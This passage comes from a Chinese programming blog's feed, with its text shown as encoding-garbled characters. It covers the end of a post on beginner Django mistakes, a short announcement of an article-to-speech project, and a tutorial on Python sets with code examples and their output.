ç•Œé¢ä¸­è®¿é—®ã€‚ç„¶åï¼Œä½ å¯ä»¥å†³å®šæ˜¯å¦è¦é˜»æ­¢ä»–ä»¬è®¿é—®ä½ çš„ç½‘ç«™æˆ–é‡‡å–å¿…è¦çš„æªæ–½ã€‚</p><h3><span id="bao-hu-mi-mi-mi-yao-he-qi-ta-guan-jian-shu-ju">ä¿æŠ¤ç§˜å¯†å¯†é’¥å’Œå…¶ä»–å…³é”®æ•°æ®</span></h3><p>ä½¿ä½ çš„é¡¹ç›®æˆä¸ºå¼€æ”¾æºä»£ç çš„æŒ‘æˆ˜ä¹‹ä¸€å°±æ˜¯è¦ä¿æŠ¤ <code>SECRET KEY</code> å’Œå…¶ä»–ä¸ªäººä»·å€¼ï¼Œä¾‹å¦‚ä½ ä¸å¸Œæœ›ä¸–ç•Œå…¶ä»–åœ°æ–¹çœ‹åˆ°çš„ç”µå­é‚®ä»¶IDå’Œå¯†ç ã€‚æˆ‘éµå¾ª <a href="https://www.youtube.com/user/schafer5">Corey Schafer</a> åœ¨ä»–çš„ YouTube è§†é¢‘ä¸­æä¾›çš„å»ºè®®ï¼Œå¹¶å°†æ‰€æœ‰è¿™äº›é‡è¦å€¼ä¿å­˜ä¸ºç¯å¢ƒå˜é‡ã€‚ä¸‡ä¸€ä½ æœ‰æ„æˆ–æ— æ„é—´å‘ç°ä½ çš„ç§˜å¯†å¯†é’¥ï¼Œå¿…é¡»ç«‹å³è¿›è¡Œæ›´æ”¹ã€‚ä½ å¯ä»¥ä½¿ç”¨ python è‡ªå¸¦çš„ <code>secrets</code> æ¨¡å—ï¼ˆéœ€è¦ Python 3.6+ï¼‰æ¥ç”Ÿæˆå¼ºå¯†é’¥ã€‚åŒæ ·ï¼Œ<a href="https://www.youtube.com/user/schafer5">Corey Schafer</a> çš„æ•™ç¨‹ä¹Ÿæ¶µç›–äº†è¿™ä¸€éƒ¨åˆ†ã€‚</p><h3><span id="da-zao-xiang-ying-shi-wang-zhan">æ‰“é€ å“åº”å¼ç½‘ç«™</span></h3><p>å¾ˆå°‘æœ‰æ•™ç¨‹ç€é‡ä»‹ç»ä½¿æ¡Œé¢å’Œç§»åŠ¨è®¾å¤‡å‹å¥½çš„ç½‘ç«™ã€‚æœ€åˆåˆ›å»ºç½‘ç«™æ—¶ï¼Œå®ƒåœ¨PCä¸Šå¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼Œä½†æ˜¯å½“æˆ‘å°è¯•åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šè®¿é—®å®ƒæ—¶ï¼Œæˆ‘æ„è¯†åˆ°å¿…é¡»é‡åšä¸€äº›æ¨¡æ¿ã€‚åœ¨åˆ›å»ºæ¨¡æ¿æ—¶ç«‹å³è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œä»¥åå¯ä»¥èŠ‚çœå¤§é‡çš„å·¥ä½œé‡ã€‚æˆ‘ä¸»è¦ä½¿ç”¨B ootstrap ä½œä¸ºå‰ç«¯ï¼Œå®ƒç€é‡äºåˆ›å»ºç§»åŠ¨ä¼˜å…ˆé¡¹ç›®ã€‚</p><h3><span id="bian-xie-ce-shi">ç¼–å†™æµ‹è¯•</span></h3><p>æ¯ä¸ªåº”ç”¨ç¨‹åºéƒ½ä¼šåˆ›å»ºä¸€ä¸ª <code>tests.py</code> æ–‡ä»¶ã€‚æˆ‘ä»ç„¶ä¸çŸ¥é“å¦‚ä½•ç¼–å†™æµ‹è¯•ã€‚æˆ‘è§‚å¯Ÿåˆ°ï¼ŒGitHubä¸Š å¯ç”¨äº Python æˆ– Django çš„è®¸å¤šè½¯ä»¶åŒ…æˆ–åº“ç¡®å®è¿›è¡Œäº†å¤§é‡æµ‹è¯•ã€‚åŒæ ·ï¼Œå¾ˆå°‘æœ‰æ•™ç¨‹è§£é‡Šå¦‚ä½•ç¼–å†™æµ‹è¯•ã€‚è¿™æ˜¯æˆ‘ä»åœ¨å°è¯•è§£å†³çš„é—®é¢˜ã€‚å½“æˆ‘æœ‰æ›´å¤šä¿¡æ¯æ—¶ï¼Œæˆ‘å°†æ›´æ–°æ­¤éƒ¨åˆ†ã€‚</p><h3><span id="shi-yong-rest-api">ä½¿ç”¨ REST API</span></h3><p>å°½ç®¡ REST API æœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªå•ç‹¬çš„è¯é¢˜ï¼Œä½†åƒæˆ‘ä»¬è¿™æ ·çš„åˆå­¦è€…åº”è¯¥çŸ¥é“ï¼Œä¸ºä»€ä¹ˆå¯¹å…¶è¿›è¡Œè®¡åˆ’å¾ˆé‡è¦ï¼Œå¦‚ä½•åˆ›å»º API ä»¥åŠå¦‚ä½•å°†å…¶ä¸ Angular æˆ– React ç­‰å…¶ä»–å‰ç«¯é›†æˆã€‚ä»¥æˆ‘çš„ç»éªŒï¼Œåœ¨è®¾è®¡è§†å›¾æ—¶åŒæ—¶ç¼–å†™ REST API ç¡®å®å¯ä»¥ä½¿äº‹æƒ…æ›´é«˜æ•ˆï¼Œå¹¶ä¸”çœå»äº†å°è¯•å¼„æ¸…æ¥šæƒé™å’Œå…¶ä»–æ–¹é¢çš„éº»çƒ¦ã€‚â€œ Django Rest Frameworkâ€ æ˜¯ REST API çš„é¦–é€‰åº“ã€‚æˆ‘é€šå¸¸ä¼šåˆ›å»ºä¸€ä¸ªå•ç‹¬çš„åä¸º â€œapiâ€ çš„åº”ç”¨ï¼Œå¹¶åœ¨æ­¤å¤„ç¼–å†™æ‰€æœ‰å…¶ä»–åº”ç”¨çš„åºåˆ—åŒ–å™¨å’Œè§†å›¾ã€‚å®ƒå°†æ‰€æœ‰å†…å®¹éƒ½æ”¾åœ¨ä¸€ä¸ªåœ°æ–¹ã€‚å°½ç®¡æˆ‘çš„é¡¹ç›®æœ‰ API å…¥å£ï¼Œä½†æˆ‘ä»ç„¶å¿…é¡»åˆ›å»ºä¸€äº› APIã€‚</p><h3><span id="zai-bu-shu-zhi-qian-she-zhi-debug-false">åœ¨éƒ¨ç½²ä¹‹å‰è®¾ç½® <code>DEBUG = False</code></span></h3><p>åœ¨éƒ¨ç½²æœŸé—´ä¿ç•™ <code>DEBUG = True</code> æ˜¯å¸¸è§é”™è¯¯ï¼Œæˆ‘ä¹ŸçŠ¯äº†ã€‚åœ¨å¯ç”¨ç½‘ç«™ä¹‹å‰ï¼Œè¯·ä¸è¦å¿˜è®°åœ¨ <code>settings.py</code> æ–‡ä»¶ä¸­å°† <code>DEBUG</code> å€¼è®¾ç½®ä¸º <code>False</code>ã€‚ä½ ä¸å¸Œæœ›æœ€ç»ˆç”¨æˆ·åœ¨URLå¼•å‘é”™è¯¯æ—¶çœ‹åˆ°æ‰€æœ‰å¼‚å¸¸å’Œå…¶ä»–ä¸ç¼–ç æœ‰å…³çš„ä¿¡æ¯ã€‚ <a href="https://www.youtube.com/user/schafer5">Corey Schafer</a> å¾ˆå¥½åœ°è§£é‡Šäº†å¦‚ä½•åœ¨ä»–çš„æ•™ç¨‹ä¸­è¿›è¡Œå¤„ç†ã€‚</p><h3><span id="bu-shu-xiang-mu">éƒ¨ç½²é¡¹ç›®</span></h3><p>å¯¹äºåƒæˆ‘è¿™æ ·çš„åˆå­¦è€…æ¥è¯´ï¼Œè¿™æ˜¯å¦ä¸€ä¸ªçœŸæ­£çš„éº»çƒ¦ã€‚æˆ‘åº”è¯¥åœ¨å“ªé‡Œéƒ¨ç½²æˆ‘çš„é¡¹ç›®ï¼ˆHerokuï¼ŒPythonAnywhereï¼ŒDigitalOceanï¼ŒAWSç­‰ï¼‰ï¼Ÿæˆ‘åº”è¯¥åšä»€ä¹ˆå‡†å¤‡å·¥ä½œï¼Ÿæˆ‘åœ¨ç”Ÿäº§ä¸­ä½¿ç”¨å“ªä¸ªæ•°æ®åº“ï¼Ÿæˆ‘éœ€è¦ä»€ä¹ˆæ‰€æœ‰æ–‡ä»¶æ¥å¼€å§‹éƒ¨ç½²ï¼ˆä¾‹å¦‚ requirements.txtï¼Œprocfile ç­‰ï¼‰ï¼Ÿæˆ‘åº”è¯¥å»å…è´¹æœåŠ¡å™¨è¿˜æ˜¯ä»˜è´¹æœåŠ¡å™¨ï¼Ÿå¾ˆå¤šäº‹æƒ…è¦è€ƒè™‘ã€‚æˆ‘æµè§ˆäº† <a href="https://www.youtube.com/user/schafer5">Corey Schafer</a> åœ¨ YouTube ä¸Šçš„è§†é¢‘ï¼Œæœ€ç»ˆå°†å…¶éƒ¨ç½²åœ¨å…è´¹çš„ Heroku æœåŠ¡å™¨ä¸Šã€‚</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å­¦ä¹ Djangoâ”€â”€æˆ‘çŠ¯çš„åˆå­¦è€…é”™è¯¯ä»¥åŠå¦‚ä½•é¿å…
    
    </summary>
    
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>é¡¹ç›®ï¼šæ–‡ç« è½¬åšå®¢ Podcastx</title>
    <link href="https://qiwihui.com/qiwihui-blog-115/"/>
    <id>https://qiwihui.com/qiwihui-blog-115/</id>
    <published>2022-08-13T01:54:25.490Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªé¡¹ç›®æ˜¯å¯¹ä¹‹å‰ä½¿ç”¨è°·æ­Œæ–‡ç« è½¬è¯­éŸ³ï¼ˆTTSï¼‰åŠŸèƒ½åçš„ä¸€ä¸ªå®éªŒæ€§äº§å“ï¼Œé¡¹ç›®ç›®å‰çš„åŠŸèƒ½æ˜¯å°†åšå®¢æ–‡ç« è½¬æˆè¯­éŸ³è¿›è¡Œæ”¶å¬ã€‚</p><p>é¡¹ç›®åœ°å€ï¼š <a href="https://podcastx.qiwihui.com">https://podcastx.qiwihui.com</a></p><p>ç›®å‰æ”¯æŒçš„åŠŸèƒ½ï¼š</p><ol><li>è¾“å…¥æ–‡ç« é“¾æ¥ï¼Œç”Ÿæˆå¯¹åº”æ–‡ç« çš„è¯­éŸ³æœ—è¯»ï¼Œç›®å‰ä¸­æ–‡ã€‚</li><li>æä¾›å†…åµŒæ’­æ”¾å™¨æ”¾å…¥åšå®¢ä¸­ï¼Œä½¿åšå®¢å¯ä»¥æœ—è¯»ã€‚</li><li>æ”¯æŒå¯¹å·²ç”Ÿæˆçš„æ’­å®¢è¿›è¡Œæœç´¢å’Œæ”¶è—ã€‚</li></ol><p>å¾…æ”¯æŒçš„åŠŸèƒ½ï¼š</p><ol><li>åŒæ—¶æ”¯æŒå¤šç§è¯­è¨€ï¼Œæ”¯æŒä¸ç”¨å£°éŸ³æœ—è¯»ã€‚</li><li>æ”¯æŒ RSS è®¢é˜…æœ—è¯»ã€‚</li><li>æ”¯æŒè¯„è®ºã€‚</li><li>æ”¯æŒæµè§ˆå™¨æ’ä»¶ã€‚</li></ol><span id="more"></span><p>è¿™ä¸ªé¡¹ç›®çš„ä¸‹ä¸€ä¸ªé˜¶æ®µçš„åŠŸèƒ½ï¼Œæ˜¯æä¾›ä»æ–‡å­—åˆ°æ’­å®¢çš„åŠŸèƒ½ï¼Œç›®çš„åœ¨äºä¸ºè®¾å¤‡æˆ–è€…å£è¯­èƒ½åŠ›æœ‰é™çš„äººæä¾›åˆ¶ä½œåšå®¢çš„æ–¹ä¾¿æ–¹æ³•ã€‚çœ‹åˆ°å¾ˆå¤šæŠ€æœ¯è¾¾äººåœ¨åˆ¶ä½œæ’­å®¢ï¼Œä½œè€…æœ¬äººä¹Ÿæƒ³åˆ¶ä½œä¸€äº›åšå®¢ï¼Œç¢äºå£è¯­è¡¨è¾¾ã€‚æ‰€ä»¥è¿™ä¸ªé¡¹ç›®çš„ç›®çš„å°±åœ¨äºå°†è¿™ä¸ªè¿‡ç¨‹é€šè¿‡æ¯”è¾ƒæˆç†Ÿçš„ttsæ¥å®ç°ã€‚</p><p>é¡¹ç›®UIï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/108465572-3ea02480-72bd-11eb-9847-7d884b1c8898.png" alt="podcastx"></p><p><img src="https://user-images.githubusercontent.com/3297411/108466753-203b2880-72bf-11eb-817c-b1ae7ec89118.png" alt="play list"></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      é¡¹ç›®ï¼šæ–‡ç« è½¬åšå®¢ Podcastx
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
      <category term="æœºå™¨å­¦ä¹ " scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="æ·±åº¦å­¦ä¹ " scheme="https://qiwihui.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>04. é›†åˆ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-121/"/>
    <id>https://qiwihui.com/qiwihui-blog-121/</id>
    <published>2022-08-13T01:54:25.490Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>é›†åˆæ˜¯æ— åºçš„å®¹å™¨æ•°æ®ç±»å‹ï¼Œå®ƒæ˜¯æ— ç´¢å¼•çš„ï¼Œå¯å˜çš„å¹¶ä¸”æ²¡æœ‰é‡å¤çš„å…ƒç´ ã€‚ é›†åˆç”¨å¤§æ‹¬å·åˆ›å»ºã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_set = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h3><span id="chuang-jian-ji-he">åˆ›å»ºé›†åˆ</span></h3><p>ä½¿ç”¨èŠ±æ‹¬å·æˆ–å†…ç½®çš„ <code>set</code> å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_set = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…ä½¿ç”¨ set å‡½æ•°ä»å¯è¿­ä»£å¯¹è±¡åˆ›å»ºï¼Œæ¯”å¦‚åˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—ç¬¦ä¸²</span></span><br><span class="line">my_set_2 = <span class="built_in">set</span>([<span class="string">&quot;one&quot;</span>, <span class="string">&quot;two&quot;</span>, <span class="string">&quot;three&quot;</span>])</span><br><span class="line">my_set_2 = <span class="built_in">set</span>((<span class="string">&quot;one&quot;</span>, <span class="string">&quot;two&quot;</span>, <span class="string">&quot;three&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(my_set_2)</span><br><span class="line"></span><br><span class="line">my_set_3 = <span class="built_in">set</span>(<span class="string">&quot;aaabbbcccdddeeeeeffff&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_set_3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨æ„ï¼šä¸€ä¸ªç©ºçš„å…ƒç»„ä¸èƒ½ä½¿ç”¨ &#123;&#125; åˆ›å»ºï¼Œè¿™ä¸ªä¼šè¯†åˆ«ä¸ºå­—å…¸</span></span><br><span class="line"><span class="comment"># ä½¿ç”¨ set() è¿›è¡Œåˆ›å»º</span></span><br><span class="line">a = &#123;&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line">a = <span class="built_in">set</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h3><span id="tian-jia-yuan-su">æ·»åŠ å…ƒç´ </span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_set = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ add() æ–¹æ³•æ·»åŠ å…ƒç´ </span></span><br><span class="line">my_set.add(<span class="number">42</span>)</span><br><span class="line">my_set.add(<span class="literal">True</span>)</span><br><span class="line">my_set.add(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨æ„ï¼šé¡ºåºä¸é‡è¦ï¼Œåªä¼šå½±å“æ‰“å°è¾“å‡º</span></span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ƒç´ å·²ç»å­˜åœ¨æ˜¯æ²¡æœ‰å½±å“</span></span><br><span class="line">my_set.add(<span class="number">42</span>)</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="literal">True</span>, <span class="number">42</span>, <span class="string">&#x27;Hello&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="literal">True</span>, <span class="number">42</span>, <span class="string">&#x27;Hello&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="yi-chu-yuan-su">ç§»é™¤å…ƒç´ </span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># remove(x): ç§»é™¤ x, å¦‚æœå…ƒç´ ä¸å­˜åœ¨åˆ™å¼•å‘ KeyError é”™è¯¯</span></span><br><span class="line">my_set = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;</span><br><span class="line">my_set.remove(<span class="string">&quot;apple&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># KeyError:</span></span><br><span class="line"><span class="comment"># my_set.remove(&quot;orange&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># discard(x): ç§»é™¤ x, å¦‚æœå…ƒç´ ä¸å­˜åœ¨åˆ™ä»€ä¹ˆä¹Ÿä¸åš</span></span><br><span class="line">my_set.discard(<span class="string">&quot;cherry&quot;</span>)</span><br><span class="line">my_set.discard(<span class="string">&quot;blueberry&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() : ç§»é™¤æ‰€æœ‰å…ƒç´ </span></span><br><span class="line">my_set.clear()</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() : ç§»é™¤å¹¶è¿”å›éšæœºä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">a = &#123;<span class="literal">True</span>, <span class="number">2</span>, <span class="literal">False</span>, <span class="string">&quot;hi&quot;</span>, <span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.pop())</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;banana&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">set</span>()</span><br><span class="line"><span class="literal">False</span></span><br><span class="line">&#123;<span class="literal">True</span>, <span class="number">2</span>, <span class="string">&#x27;hi&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="jian-cha-yuan-su-shi-fou-cun-zai">æ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_set = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;apple&quot;</span> <span class="keyword">in</span> my_set:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure><h3><span id="die-dai">è¿­ä»£</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ for å¾ªç¯è¿­ä»£é›†åˆ</span></span><br><span class="line"><span class="comment"># æ³¨æ„ï¼šé¡ºåºä¸é‡è¦</span></span><br><span class="line">my_set = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_set:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">banana</span><br><span class="line">apple</span><br><span class="line">cherry</span><br></pre></td></tr></table></figure><h3><span id="bing-ji-he-jiao-ji">å¹¶é›†å’Œäº¤é›†</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">odds = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>&#125;</span><br><span class="line">evens = &#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>&#125;</span><br><span class="line">primes = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># union() : åˆå¹¶æ¥è‡ªä¸¤ä¸ªé›†åˆçš„å…ƒç´ ï¼Œä¸é‡å¤</span></span><br><span class="line"><span class="comment"># æ³¨æ„è¿™ä¸ä¼šæ”¹å˜ä¸¤ä¸ªé›†åˆ</span></span><br><span class="line">u = odds.union(evens)</span><br><span class="line"><span class="built_in">print</span>(u)</span><br><span class="line"></span><br><span class="line"><span class="comment"># intersection(): é€‰æ‹©åœ¨ä¸¤ä¸ªé›†åˆä¸­éƒ½å­˜åœ¨çš„å…ƒç´ </span></span><br><span class="line">i = odds.intersection(evens)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">i = odds.intersection(primes)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">i = evens.intersection(primes)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line"><span class="built_in">set</span>()</span><br><span class="line">&#123;<span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>&#125;</span><br><span class="line">&#123;<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="ji-he-de-chai">é›†åˆçš„å·®</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">setB = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># difference() : è¿”å›é›†åˆ setA ä¸­ä¸åœ¨é›†åˆ setB ä¸­çš„å…ƒç´ çš„é›†åˆ</span></span><br><span class="line">diff_set = setA.difference(setB)</span><br><span class="line"><span class="built_in">print</span>(diff_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A.difference(B) ä¸ B.difference(A) ä¸ä¸€æ ·</span></span><br><span class="line">diff_set = setB.difference(setA)</span><br><span class="line"><span class="built_in">print</span>(diff_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># symmetric_difference() : è¿”å›é›†åˆ setA å’Œ setB ä¸­ä¸åŒæ—¶åœ¨ä¸¤ä¸ªé›†åˆä¸­çš„å…ƒç´ çš„é›†åˆ</span></span><br><span class="line">diff_set = setA.symmetric_difference(setB)</span><br><span class="line"><span class="built_in">print</span>(diff_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A.symmetric_difference(B) = B.symmetric_difference(A)</span></span><br><span class="line">diff_set = setB.symmetric_difference(setA)</span><br><span class="line"><span class="built_in">print</span>(diff_set)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">&#123;<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="geng-xin-ji-he">æ›´æ–°é›†åˆ</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">setB = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># update() : é€šè¿‡æ·»åŠ å…¶ä»–é›†åˆçš„å…ƒç´ è¿›è¡Œæ›´æ–°</span></span><br><span class="line">setA.update(setB)</span><br><span class="line"><span class="built_in">print</span>(setA)</span><br><span class="line"></span><br><span class="line"><span class="comment"># intersection_update() : é€šè¿‡ä¿ç•™å…±åŒçš„å…ƒç´ è¿›è¡Œæ›´æ–°</span></span><br><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">setA.intersection_update(setB)</span><br><span class="line"><span class="built_in">print</span>(setA)</span><br><span class="line"></span><br><span class="line"><span class="comment"># difference_update() : é€šè¿‡ç§»é™¤ä¸å…¶ä»–é›†åˆä¸­ç›¸åŒçš„å…ƒç´ è¿›è¡Œæ›´æ–°</span></span><br><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">setA.difference_update(setB)</span><br><span class="line"><span class="built_in">print</span>(setA)</span><br><span class="line"></span><br><span class="line"><span class="comment"># symmetric_difference_update() : é€šè¿‡ä¿ç•™åªå‡ºç°åœ¨ä¸€ä¸ªé›†åˆè€Œä¸å‡ºç°åœ¨å¦ä¸€ä¸ªé›†åˆä¸­çš„å…ƒç´ è¿›è¡Œæ›´æ–°</span></span><br><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">setA.symmetric_difference_update(setB)</span><br><span class="line"><span class="built_in">print</span>(setA)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 